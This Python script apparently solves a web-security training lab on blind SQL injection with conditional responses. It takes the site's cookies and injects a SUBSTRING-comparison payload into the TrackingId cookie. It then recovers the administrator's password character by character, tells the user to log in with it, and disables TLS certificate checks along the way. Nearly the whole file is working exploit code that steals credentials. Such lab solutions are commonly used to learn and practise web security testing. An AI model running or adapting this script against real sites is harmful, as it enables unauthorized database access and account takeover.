import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SQL injection with conditional responses"

# Smaller charset for efficiency
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"


def sqli_password(url, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    # Step 1: Get initial cookies
    print("[+] Fetching initial session and tracking ID...")
    response = session.get(url)
    cookies = session.cookies.get_dict()

    tracking_id = cookies.get('TrackingId')
    session_id = cookies.get('session')

    if not tracking_id or not session_id:
        print("[-] Failed to retrieve required cookies.")
        return False

    print(f"[+] TrackingId: {tracking_id}")
    print(f"[+] Session: {session_id}")

    # Step 2: Perform Blind SQLi
    extracted_password = ""
    print("[+] Extracting administrator password:")
    for i in range(1, 21):
        for char in CHARSET:
            payload = (
                f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}'--"
            )
            full_tracking_id = tracking_id + urllib.parse.quote(payload)

            cookies = {
                'TrackingId': full_tracking_id,
                'session': session_id
            }

            r = session.get(url, cookies=cookies)
            if "Welcome" in r.text:
                extracted_password += char
                sys.stdout.write('\r' + extracted_password)
                sys.stdout.flush()
                break

    print("\n[+] Extraction complete.")
    print(f"[+] Administrator password: {extracted_password}")
    print("[+] Login with above creds!")
    return True


def run(url, payload=None, proxies=None):
    return sqli_password(url, proxies)
